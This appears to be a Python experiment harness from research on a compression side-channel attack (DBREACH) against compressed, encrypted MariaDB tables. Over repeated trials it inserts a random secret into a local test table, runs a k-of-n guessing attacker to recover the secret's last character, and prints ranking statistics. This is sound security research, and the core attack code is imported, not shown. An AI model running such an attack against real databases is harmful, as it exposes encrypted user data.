import utils.mariadb_utils as utils
import dbreacher
import dbreacher_impl
import k_of_n_attacker
import random
import string
import statistics
import time
import sys

scoring_system = sys.argv[1].replace("--", "")
print(scoring_system)

maxRowSize = 200

control = utils.MariaDBController("testdb")

table = "victimtable"

prefix_len_to_poses = dict()
for prefix_len in range(1, 21):
    prefix_len_to_poses[prefix_len] = dict()
    for i in range(100):
        prefix_len_to_poses[prefix_len][i] = []

prefix_len_to_poses_new = dict()
for prefix_len in range(1, 21):
    prefix_len_to_poses_new[prefix_len] = dict()
    for i in range(100):
        prefix_len_to_poses_new[prefix_len][i] = []

print("prefix_length,amplification_rounds,scoring_system,is_in_first,ranking,points_behind_first,points_ahead_next_char,points_between_first_and_second,time_for_current_round")
for trial in range(100):
    print("STARTING TRIAL " + str(trial))
    for prefix_len in [1, 2, 3, 5, 10, 15, 20]:
        known_prefix = ''.join(random.choices(string.ascii_lowercase, k=prefix_len)) 

        possibilities = []
        for c in string.ascii_lowercase:
            possibilities.append(known_prefix + c)

        num_secrets = 1
        secret = random.choice(possibilities)
        correct_char = secret[-1]

        scores = dict()
        scores_new = dict()
        for c in string.ascii_lowercase:
            scores[c] = 0
            scores_new[c] = 0
        i = 0

        control.drop_table(table)
        time.sleep(1)
        control.create_basic_table(table,
                varchar_len=maxRowSize,
                compressed=True,
                encrypted=True)
        control.insert_row(table, 0, secret)
        dbreacher = dbreacher_impl.DBREACHerImpl(control, table, num_secrets, maxRowSize, string.printable.replace(string.ascii_lowercase, '').replace('*', ''), ord('*'))

        attacker = k_of_n_attacker.kOfNAttacker(len(string.ascii_lowercase), dbreacher, possibilities, True)
        points_between_first_and_second = 0
        while i < 40 or (points_between_first_and_second < 35 and i < 100):
            start = time.time()
            success = attacker.setUp()
            if not success:
                continue
            else:
                successful = attacker.tryAllGuesses(verbose = False)
                end = time.time()
                if not successful:
                    continue
                winners = attacker.getTopKGuesses()
                winners_by_bytes_to_shrink = [(round(1/s), g) for (s, g) in winners]
                top_score = winners_by_bytes_to_shrink[0][0]
                normalized = [(b - top_score, g[len(g) - 1]) for (b, g) in winners_by_bytes_to_shrink]
                if scoring_system == "outlier":
                    scores[normalized[0][1]] += (normalized[0][0] - normalized[1][0])
                    scores[normalized[-1][1]] += (normalized[-2][0] - normalized[-1][0])
                else:
                    for (b, c) in normalized:
                        scores[c] += b

                scores_new[normalized[0][1]] += abs(normalized[0][0] - normalized[1][0])
                scores_new[normalized[-1][1]] += abs(normalized[-1][0] - normalized[-2][0])
                leaderboard = [(b, c) for (c, b) in scores.items()]
                leaderboard.sort()
                
                # get position of correct char
                scores_to_chars = dict()
                for b, c in leaderboard:
                    if b in scores_to_chars:
                        scores_to_chars[b].add(c)
                    else:
                        scores_to_chars[b] = set([c])

                keys = [b for (b, l) in scores_to_chars.items()]
                keys.sort()
                place = 0
                points_behind = 0
                points_ahead = 0
                for idx, key in enumerate(keys):
                    if correct_char not in scores_to_chars[key]:
                        place += len(scores_to_chars[key])
                    if correct_char in scores_to_chars[key]:
                        position = statistics.mean([place + 1 + i for i in range(len(scores_to_chars[key]))])
                        place = position
                        points_behind = key - keys[0]
                        points_ahead = 0
                        if idx < len(keys) - 1 and len(scores_to_chars[key]) == 1:
                            points_ahead = keys[idx + 1] - key
                        prefix_len_to_poses[prefix_len][i].append((position, points_behind, points_ahead))
                        break
                if len(keys) > 1:
                    points_between_first_and_second = keys[1] - keys[0]
                print(str(prefix_len) + ","+str(i)+",0,"+str(1 if place == 1 else 0)+","+str(place)+","+str(points_behind)+","+str(points_ahead)+","+str(points_between_first_and_second)+","+str(end - start))

                i += 1

